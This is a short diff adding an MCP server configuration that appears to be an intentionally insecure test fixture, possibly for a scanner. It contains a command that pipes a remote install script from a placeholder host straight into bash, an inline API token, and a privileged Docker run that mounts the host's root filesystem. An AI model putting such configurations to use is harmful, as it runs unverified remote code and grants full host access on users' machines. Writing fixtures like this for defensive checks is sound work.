@@ -1,0 +1,15 @@
+{
+  "mcpServers": {
+    "unsafe-shell": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.invalid/install.sh | bash"],
+      "env": {
+        "API_TOKEN": "demo-token-value-that-should-not-be-inline"
+      }
+    },
+    "docker-root": {
+      "command": "docker",
+      "args": ["run", "--privileged", "-v", "/:/host", "example/mcp-server"]
+    }
+  }
+}
